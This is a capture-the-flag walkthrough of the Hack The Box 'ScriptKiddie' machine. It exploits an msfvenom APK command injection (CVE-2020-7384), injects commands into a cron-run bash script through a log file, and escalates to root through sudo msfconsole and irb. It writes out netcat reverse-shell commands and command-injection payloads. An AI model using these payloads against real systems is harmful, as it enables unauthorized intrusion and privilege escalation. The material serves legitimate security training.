# Hack The Box: ScriptKiddie

**Difficulty:** Easy
**OS:** Linux

ScriptKiddie is an Easy-level Linux machine designed to demonstrate the exploitation of vulnerabilities within common hacking tools themselves, specifically Metasploit. The initial compromise relies on a known OS command injection vulnerability in Metasploit's payload generation tool, `msfvenom`. Privilege escalation involves lateral movement via a poorly sanitized bash script, and finally, exploiting `sudo` privileges to run Metasploit console (`msfconsole`) as root to gain an administrative shell.

---

## Reconnaissance

We begin the assessment by scanning the target for open ports using `nmap`.

```bash
nmap -p- --min-rate 10000 10.10.10.226
nmap -p 22,5000 -sCV 10.10.10.226
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 5000:** HTTP (Werkzeug httpd 0.16.1 Python 3.8.5)

Navigating to the web service on port 5000 displays a landing page offering several "hacker tools." The page provides web interfaces for generating payloads, running `nmap` scans, and utilizing `searchsploit`.

## Web Exploitation

The core functionality of the web application allows users to interact with common penetration testing tools.

### Exploiting `msfvenom` (CVE-2020-7384)

The "Payloads" section of the web application provides options to generate payloads for Android, Windows, and Linux. When selecting the Android or Windows options, the application expects an LHOST (Listening Host) IP address and an LPORT (Listening Port). The server takes these inputs and likely runs `msfvenom` on the backend to create the requested payload.

When we select the Android payload option, we notice an upload field for an existing APK file. This suggests the application is using `msfvenom` to inject a payload into an existing Android application template.

In late 2020, a vulnerability (CVE-2020-7384) was discovered in Metasploit Framework's `msfvenom` tool. The vulnerability occurs when `msfvenom` processes a specifically crafted Android Application Package (APK) file. The tool parses the `AndroidManifest.xml` file within the APK using `apktool` and an insecure implementation of the `Open3.popen3` function in Ruby.

By creating a malicious APK file containing command injection syntax within its manifest, we can force the server running `msfvenom` to execute arbitrary commands.

There are publicly available Python exploit scripts that generate this malicious APK.

```bash
# Generating the malicious APK on our attacking machine
python3 cve-2020-7384.py -c "nc -e /bin/sh 10.10.14.X 9999"
```

The script produces a file, typically named `evil.apk`.

We start a Netcat listener on our attacking machine.

```bash
nc -lnvp 9999
```

We return to the web application on port 5000, select the Android payload generation option, provide our listener IP and port, and upload our malicious `evil.apk`. The backend executes `msfvenom` to parse the file, triggering the command injection vulnerability and establishing a reverse shell connection.

```bash
# Connection received
id
# uid=1000(kid) gid=1000(kid) groups=1000(kid)
```

## Lateral Movement

We gain initial access as the `kid` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is retrieved from the `kid` user's home directory.

Enumerating the system as `kid`, we check for other user directories. We discover a user named `pwn`.

We search for scheduled tasks, processes, and misconfigurations. In `/home/pwn`, we locate a bash script named `scanlosers.sh`.

```bash
cat /home/pwn/scanlosers.sh
```

### Analyzing `scanlosers.sh`

The script continuously monitors an `nmap` log file located in the `kid` user's directory (`/home/kid/logs/hackers`).

```bash
#!/bin/bash
log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done
# ...
```

The script reads lines from the `hackers` log file, extracts the IP address field, and passes it unsafely into a subshell (`sh -c`) running an `nmap` scan.

Because the `hackers` file is located in the `kid` user's home directory and is writable by `kid`, we can manipulate its contents to inject commands.

The script extracts fields starting from the third word (`cut -d' ' -f3-`). To inject commands successfully, we must prepend our payload with two dummy words to satisfy the `cut` command, followed by shell operators (like `;` or `&&`) to terminate the `nmap` command and execute ours.

We write our payload into the `hackers` log file:

```bash
echo "dummy1 dummy2 ; nc -e /bin/sh 10.10.14.X 8888 #" >> /home/kid/logs/hackers
```

The trailing `#` comments out the remainder of the `nmap` command constructed by the script.

We start a new Netcat listener. When the cron job or continuous loop executing `scanlosers.sh` processes the updated log file, it runs our payload as the user `pwn`.

```bash
nc -lnvp 8888
# Connection received
id
# uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
```

## Privilege Escalation

Enumerating the system as `pwn`, we check for commands the user can run using `sudo`.

```bash
sudo -l
```

The output reveals that the user `pwn` can run the `msfconsole` binary as `root` without a password.

```text
User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-5.1.0/msfconsole
```

### Abusing Sudo & msfconsole

The `msfconsole` utility is the interactive command-line interface for the Metasploit Framework. Because `pwn` can execute `msfconsole` via `sudo`, we can abuse the console environment to gain an interactive root shell.

We execute the permitted command:

```bash
sudo /opt/metasploit-framework-5.1.0/msfconsole
```

Once `msfconsole` loads, it provides a Ruby-based prompt. The Metasploit console supports executing arbitrary shell commands by prefixing them with an exclamation mark (`!`) or simply running standard Linux binaries.

More reliably, we can leverage the built-in `irb` (Interactive Ruby) prompt within Metasploit to execute system commands.

We type `irb` to drop into the Ruby environment. Because the console was started with `sudo`, the Ruby environment runs as root.

```text
msf6 > irb
[*] Starting IRB shell...
>> 
```

Within `irb`, we execute a system call to spawn an interactive bash shell.

```ruby
>> system("/bin/bash -p")
```

The command executes, replacing the current process with an interactive shell.

```bash
# id
uid=0(root) gid=1001(pwn) euid=0(root) groups=1001(pwn)
```

The machine is fully compromised, and the `root.txt` flag can be retrieved from the `/root` directory.
